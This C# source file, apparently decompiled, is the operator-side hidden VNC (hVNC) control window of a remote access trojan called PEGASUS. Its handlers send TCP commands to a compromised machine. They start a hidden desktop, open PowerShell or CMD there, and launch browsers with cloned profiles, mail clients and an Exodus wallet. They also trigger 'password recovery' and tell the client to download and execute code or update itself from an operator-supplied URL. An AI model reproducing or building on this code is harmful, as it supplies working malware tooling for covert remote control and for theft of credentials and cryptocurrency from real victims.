using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using HVNC;
using Microsoft.VisualBasic.CompilerServices;

namespace PEGASUS.Design.PEGASUS.PEGASUS_HVNC
{
	public class FrmV : Form
	{
		private bool bool_1;

		private bool bool_2;

		private int int_0;

		private TcpClient tcpClient_0;

		public FrmTransfer FrmTransfer0;

		private IContainer components;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel3;

		public ToolStripStatusLabel PingStatusLabel;

		private Guna2DragControl guna2DragControl1;

		private System.Windows.Forms.Timer timer2;

		private System.Windows.Forms.Timer timer1;

		private Guna2ContextMenuStrip guna2ContextMenuStrip2;

		private ToolStripMenuItem fileExplorerToolStripMenuItem;

		private ToolStripMenuItem powershellToolStripMenuItem;

		private ToolStripMenuItem cMDToolStripMenuItem;

		private ToolStripMenuItem windowsToolStripMenuItem;

		private ToolStripMenuItem copyToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem StarthVNC;

		private ToolStripMenuItem StophVNC;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem test1ToolStripMenuItem;

		private ToolStripMenuItem test2ToolStripMenuItem;

		private ToolStripMenuItem braveToolStripMenuItem;

		private ToolStripMenuItem edgeToolStripMenuItem;

		private ToolStripMenuItem operaGXToolStripMenuItem;

		private Guna2ContextMenuStrip guna2ContextMenuStrip3;

		private ToolStripMenuItem thunderbirdToolStripMenuItem;

		private ToolStripMenuItem outlookToolStripMenuItem;

		private ToolStripMenuItem foxMailToolStripMenuItem;

		private Panel panel1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2PictureBox btnClose;

		private Guna2Button btnSystem;

		private Guna2TrackBar QualityScroll;

		private Label QualityLabel;

		private Guna2Button btnDisconnect;

		private Guna2TrackBar ResizeScroll;

		private Label label1;

		private Label chkClone1;

		private Guna2Button btnBrowsers;

		private Guna2CustomCheckBox chkClone;

		private Guna2Button btnApps;

		public Label ClientRecoveryLabel;

		private PictureBox pictureBox1;

		private Panel panel3;

		private Panel panel4;

		private Guna2TrackBar IntervalScroll;

		private Label IntervalLabel;

		private Guna2ImageButton CloseBtn;

		private Guna2ImageButton RestoreMaxBtn;

		private Guna2ImageButton MinBtn;

		private PictureBox VNCBox;

		private ToolStripMenuItem walletsToolStripMenuItem;

		private ToolStripMenuItem exodosToolStripMenuItem;

		private ToolStripMenuItem passwordRecoveryToolStripMenuItem;

		private ToolStripMenuItem updateClientToolStripMenuItem;

		private ToolStripMenuItem downloadExecuteToolStripMenuItem;

		private ToolStripMenuItem autoScaleToolStripMenuItem;

		public string xxip { get; set; }

		public string xhostname { get; internal set; }

		public PictureBox VNCBoxe
		{
			get
			{
				return VNCBox;
			}
			set
			{
				VNCBox = value;
			}
		}

		public string xip { get; internal set; }

		public FrmV()
		{
			int_0 = 0;
			bool_1 = true;
			bool_2 = false;
			FrmTransfer0 = new FrmTransfer();
			InitializeComponent();
			VNCBox.MouseEnter += VNCBox_MouseEnter;
			VNCBox.MouseLeave += VNCBox_MouseLeave;
			VNCBox.KeyPress += VNCBox_KeyPress;
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			FindForm().ActiveControl = null;
			base.ActiveControl = null;
		}

		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		private void FrmV_FormClosing(object sender, FormClosingEventArgs e)
		{
			SendTCP("1*", tcpClient_0);
			VNCBox.Image = null;
			GC.Collect();
			Hide();
			e.Cancel = true;
		}

		private void FrmV_Load(object sender, EventArgs e)
		{
			if (FrmTransfer0.IsDisposed)
			{
				FrmTransfer0 = new FrmTransfer();
			}
			FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			tcpClient_0 = (TcpClient)base.Tag;
			VNCBox.Tag = new Size(1028, 1028);
		}

		public void Check()
		{
			try
			{
				if (FrmTransfer0.FileTransferLabele.Text == null)
				{
					toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			Check();
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				int_0 += 100;
				if (int_0 >= SystemInformation.DoubleClickTime)
				{
					bool_1 = true;
					bool_2 = false;
					int_0 = 0;
				}
			}
		}

		private void FrmV_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (bool_1)
			{
				bool_1 = false;
				timer1.Start();
			}
			else if (int_0 < SystemInformation.DoubleClickTime)
			{
				bool_2 = true;
			}
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
				}
			}
			else if (e.Button == MouseButtons.Left)
			{
				SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			VNCBox.Focus();
		}

		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
		}

		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)VNCBox.Width / (double)size.Width;
			double num2 = (double)VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
		{
			QualityLabel.Text = "High Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
			SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
		{
			chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
			SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
		}

		private void btnBrowsers_Click(object sender, EventArgs e)
		{
			guna2ContextMenuStrip1.Show(btnBrowsers, 0, btnBrowsers.Height);
		}

		private void btnSystem_Click(object sender, EventArgs e)
		{
			guna2ContextMenuStrip2.Show(btnSystem, 0, btnSystem.Height);
		}

		private void btnApps_Click(object sender, EventArgs e)
		{
			guna2ContextMenuStrip3.Show(btnApps, 0, btnApps.Height);
		}

		private void btnDisconnect_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				SendTCP("24*", tcpClient_0);
				Close();
			}
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			Hide();
		}

		private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		private void CloseBtn_Click(object sender, EventArgs e)
		{
			SendTCP("16*", tcpClient_0);
		}

		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			SendTCP("15*", tcpClient_0);
		}

		private void MinBtn_Click(object sender, EventArgs e)
		{
			SendTCP("14*", tcpClient_0);
		}

		private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (chkClone.Checked)
			{
				if (FrmTransfer0.IsDisposed)
				{
					FrmTransfer0 = new FrmTransfer();
				}
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				FrmTransfer0.Hide();
				SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("21*", tcpClient_0);
		}

		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("4876*", tcpClient_0);
		}

		private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("4875*", tcpClient_0);
		}

		private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3307*", tcpClient_0);
		}

		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
		}

		private void StarthVNC_Click(object sender, EventArgs e)
		{
			SendTCP("0*", tcpClient_0);
			FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
		}

		private void StophVNC_Click(object sender, EventArgs e)
		{
			SendTCP("1*", tcpClient_0);
			VNCBox.Image = null;
			FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
			GC.Collect();
		}

		private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("557*", tcpClient_0);
		}

		private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("555*", tcpClient_0);
		}

		private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("556*", tcpClient_0);
		}

		private void exodosToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("1980*", tcpClient_0);
		}

		public void hhURL()
		{
			string text = InputDialog.Show("\nType Your Link Here.\n\n");
			if (!string.IsNullOrEmpty(text))
			{
				SendTCP("8585* " + text, (TcpClient)base.Tag);
			}
		}

		public void uUpdateClient()
		{
			string text = InputDialog.Show("\nType Your Link Here.\n\n");
			if (!string.IsNullOrEmpty(text))
			{
				SendTCP("8589* " + text, (TcpClient)base.Tag);
			}
		}

		public void hURL(string url)
		{
			SendTCP("8585* " + url, (TcpClient)base.Tag);
		}

		public void UpdateClient(string url)
		{
			SendTCP("8589* " + url, (TcpClient)base.Tag);
		}

		public void ResetScale()
		{
			SendTCP("8587*", (TcpClient)base.Tag);
		}

		public void KillChrome()
		{
			SendTCP("8586*", (TcpClient)base.Tag);
		}

		public void PEGASUSRecovery()
		{
			SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void updateClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			uUpdateClient();
		}

		private void downloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			hhURL();
		}

		private void autoScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ResetScale();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS.PEGASUS_HVNC.FrmV));
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			timer2 = new System.Windows.Forms.Timer(components);
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
			PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
			timer1 = new System.Windows.Forms.Timer(components);
			guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			fileExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			windowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			StarthVNC = new System.Windows.Forms.ToolStripMenuItem();
			StophVNC = new System.Windows.Forms.ToolStripMenuItem();
			guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			test1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			test2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			braveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			edgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			operaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			guna2ContextMenuStrip3 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			foxMailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			walletsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			exodosToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			updateClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			downloadExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			autoScaleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			panel1 = new System.Windows.Forms.Panel();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			btnClose = new Guna.UI2.WinForms.Guna2PictureBox();
			btnSystem = new Guna.UI2.WinForms.Guna2Button();
			QualityScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			QualityLabel = new System.Windows.Forms.Label();
			btnDisconnect = new Guna.UI2.WinForms.Guna2Button();
			ResizeScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			label1 = new System.Windows.Forms.Label();
			chkClone1 = new System.Windows.Forms.Label();
			btnBrowsers = new Guna.UI2.WinForms.Guna2Button();
			chkClone = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			btnApps = new Guna.UI2.WinForms.Guna2Button();
			ClientRecoveryLabel = new System.Windows.Forms.Label();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			panel3 = new System.Windows.Forms.Panel();
			panel4 = new System.Windows.Forms.Panel();
			IntervalScroll = new Guna.UI2.WinForms.Guna2TrackBar();
			IntervalLabel = new System.Windows.Forms.Label();
			CloseBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			RestoreMaxBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			MinBtn = new Guna.UI2.WinForms.Guna2ImageButton();
			VNCBox = new System.Windows.Forms.PictureBox();
			statusStrip1.SuspendLayout();
			guna2ContextMenuStrip2.SuspendLayout();
			guna2ContextMenuStrip1.SuspendLayout();
			guna2ContextMenuStrip3.SuspendLayout();
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)btnClose).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			panel4.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)VNCBox).BeginInit();
			SuspendLayout();
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			timer2.Enabled = true;
			timer2.Interval = 1000;
			timer2.Tick += new System.EventHandler(timer2_Tick);
			statusStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripStatusLabel3, PingStatusLabel });
			statusStrip1.Location = new System.Drawing.Point(0, 610);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Size = new System.Drawing.Size(1154, 22);
			statusStrip1.TabIndex = 20;
			statusStrip1.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown);
			toolStripStatusLabel3.ForeColor = System.Drawing.Color.Gainsboro;
			toolStripStatusLabel3.Name = "toolStripStatusLabel3";
			toolStripStatusLabel3.Size = new System.Drawing.Size(39, 17);
			toolStripStatusLabel3.Text = "Status";
			PingStatusLabel.ForeColor = System.Drawing.Color.Gainsboro;
			PingStatusLabel.Name = "PingStatusLabel";
			PingStatusLabel.Size = new System.Drawing.Size(59, 17);
			PingStatusLabel.Text = "Ping: 0ms";
			PingStatusLabel.Visible = false;
			timer1.Tick += new System.EventHandler(timer1_Tick);
			guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { fileExplorerToolStripMenuItem, powershellToolStripMenuItem, cMDToolStripMenuItem, windowsToolStripMenuItem, copyToolStripMenuItem, toolStripMenuItem2, StarthVNC, StophVNC });
			guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip2";
			guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip2.ShowImageMargin = false;
			guna2ContextMenuStrip2.Size = new System.Drawing.Size(220, 196);
			fileExplorerToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			fileExplorerToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			fileExplorerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			fileExplorerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileExplorerToolStripMenuItem.Image");
			fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
			fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			fileExplorerToolStripMenuItem.Text = "  File Explorer                 ";
			fileExplorerToolStripMenuItem.Click += new System.EventHandler(fileExplorerToolStripMenuItem_Click);
			powershellToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			powershellToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			powershellToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			powershellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("powershellToolStripMenuItem.Image");
			powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
			powershellToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			powershellToolStripMenuItem.Text = "  Powershell";
			powershellToolStripMenuItem.Click += new System.EventHandler(powershellToolStripMenuItem_Click);
			cMDToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			cMDToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			cMDToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			cMDToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cMDToolStripMenuItem.Image");
			cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
			cMDToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			cMDToolStripMenuItem.Text = "  CMD";
			cMDToolStripMenuItem.Click += new System.EventHandler(cMDToolStripMenuItem_Click);
			windowsToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			windowsToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			windowsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			windowsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("windowsToolStripMenuItem.Image");
			windowsToolStripMenuItem.Name = "windowsToolStripMenuItem";
			windowsToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			windowsToolStripMenuItem.Text = "  Windows";
			windowsToolStripMenuItem.Visible = false;
			windowsToolStripMenuItem.Click += new System.EventHandler(windowsToolStripMenuItem_Click);
			copyToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			copyToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			copyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			copyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("copyToolStripMenuItem.Image");
			copyToolStripMenuItem.Name = "copyToolStripMenuItem";
			copyToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			copyToolStripMenuItem.Text = "  Copy";
			copyToolStripMenuItem.Click += new System.EventHandler(copyToolStripMenuItem_Click);
			toolStripMenuItem2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			toolStripMenuItem2.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			toolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			toolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem2.Image");
			toolStripMenuItem2.Name = "toolStripMenuItem2";
			toolStripMenuItem2.Size = new System.Drawing.Size(219, 24);
			toolStripMenuItem2.Text = "  Paste";
			toolStripMenuItem2.Click += new System.EventHandler(toolStripMenuItem2_Click);
			StarthVNC.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			StarthVNC.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			StarthVNC.ForeColor = System.Drawing.Color.White;
			StarthVNC.Image = (System.Drawing.Image)resources.GetObject("StarthVNC.Image");
			StarthVNC.Name = "StarthVNC";
			StarthVNC.Size = new System.Drawing.Size(219, 24);
			StarthVNC.Text = "  Start hVNC";
			StarthVNC.Click += new System.EventHandler(StarthVNC_Click);
			StophVNC.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			StophVNC.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			StophVNC.ForeColor = System.Drawing.Color.White;
			StophVNC.Image = (System.Drawing.Image)resources.GetObject("StophVNC.Image");
			StophVNC.Name = "StophVNC";
			StophVNC.Size = new System.Drawing.Size(219, 24);
			StophVNC.Text = "  Stop hVNC";
			StophVNC.Click += new System.EventHandler(StophVNC_Click);
			guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { test1ToolStripMenuItem, test2ToolStripMenuItem, braveToolStripMenuItem, edgeToolStripMenuItem, operaGXToolStripMenuItem });
			guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
